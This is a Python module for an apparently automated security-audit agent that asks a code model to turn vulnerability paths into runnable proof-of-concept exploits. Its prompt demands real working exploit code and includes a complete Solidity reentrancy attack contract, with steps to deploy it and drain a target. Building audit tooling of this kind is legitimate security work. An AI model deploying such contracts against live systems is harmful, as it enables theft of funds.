"""
Forge — PoC Exploit Generator
Third agent. Takes Hunter's exploit paths and uses Muse Code to generate
runnable proof-of-concept exploit code.
"""
import json
import logging
from openai import AsyncOpenAI
from config import META_API_KEY, META_API_BASE_URL, MUSE_CODE_MODEL
from models import ExploitPath, ProofOfConcept
from agents.base import BaseAgent
from signing import ArgusLedger

log = logging.getLogger(__name__)

_SYSTEM = """You are Forge, a security exploit code generation agent.

Given an exploit chain, generate a concrete, runnable proof-of-concept exploit.
Return ONLY a JSON array:
[
  {
    "function_name": "withdraw",
    "poc_code": "// Full, runnable Solidity PoC contract or Python/JS attack script\npragma solidity ^0.8.0;\n\ninterface IVulnerable {\n    function deposit() external payable;\n    function withdraw() external;\n}\n\ncontract ReentrancyAttack {\n    IVulnerable public target;\n    address public owner;\n    uint public attackCount;\n\n    constructor(address _target) {\n        target = IVulnerable(_target);\n        owner = msg.sender;\n    }\n\n    function attack() external payable {\n        target.deposit{value: msg.value}();\n        target.withdraw();\n    }\n\n    receive() external payable {\n        if (attackCount < 5 && address(target).balance >= msg.value) {\n            attackCount++;\n            target.withdraw();\n        }\n    }\n\n    function collect() external {\n        payable(owner).transfer(address(this).balance);\n    }\n}",
    "language": "solidity",
    "explanation": "Deploy this contract, call attack() with 0.1 ETH. The receive() fallback re-calls withdraw() up to 5 times, draining the target."
  }
]

Write real, working exploit code. The PoC must directly correspond to the exploit chain provided.
For Solidity vulns: write a Solidity attack contract.
For Python/JS vulns: write runnable Python or JavaScript.
Be precise, not generic."""


class ForgeAgent(BaseAgent):
    def __init__(self, ledger: ArgusLedger):
        super().__init__("forge", ledger)
        self._client: AsyncOpenAI | None = None

    @property
    def client(self) -> AsyncOpenAI:
        if self._client is None:
            self._client = AsyncOpenAI(api_key=META_API_KEY, base_url=META_API_BASE_URL)
        return self._client

    async def run(self, paths: list[ExploitPath], envelope: dict, transfer_id: str) -> tuple[list[ProofOfConcept], dict]:
        paths_raw = [p.model_dump() for p in paths]
        self._verify_from("hunter", envelope, paths_raw)

        if not paths:
            log.info("[Forge] No exploit paths — nothing to generate.")
            return [], self._sign_to("arbiter", [], transfer_id)

        log.info(f"[Forge] Generating PoC for {len(paths)} exploit path(s) — audit {transfer_id}")

        paths_json = json.dumps(paths_raw, indent=2)

        resp = await self.client.chat.completions.create(
            model=MUSE_CODE_MODEL,
            messages=[
                {"role": "system", "content": _SYSTEM},
                {"role": "user",   "content": f"Exploit paths to implement:\n{paths_json}\n\nReturn only valid JSON array."},
            ],
            temperature=0.2,
            max_tokens=4096,
        )

        raw   = resp.choices[0].message.content or ""
        items = self._parse_arr(raw, "Forge")

        pocs: list[ProofOfConcept] = []
        for i, item in enumerate(items):
            matched_path = paths[i] if i < len(paths) else paths[0]
            try:
                pocs.append(ProofOfConcept(
                    exploit_path=matched_path,
                    poc_code=item.get("poc_code", ""),
                    language=item.get("language", "solidity"),
                    verified=False,
                    explanation=item.get("explanation", ""),
                ))
            except Exception as e:
                log.warning(f"[Forge] Skipped malformed PoC: {e}")

        envelope = self._sign_to("arbiter", [p.model_dump() for p in pocs], transfer_id)
        log.info(f"[Forge] {len(pocs)} PoC(s) generated. Handoff signed → Arbiter.")
        return pocs, envelope
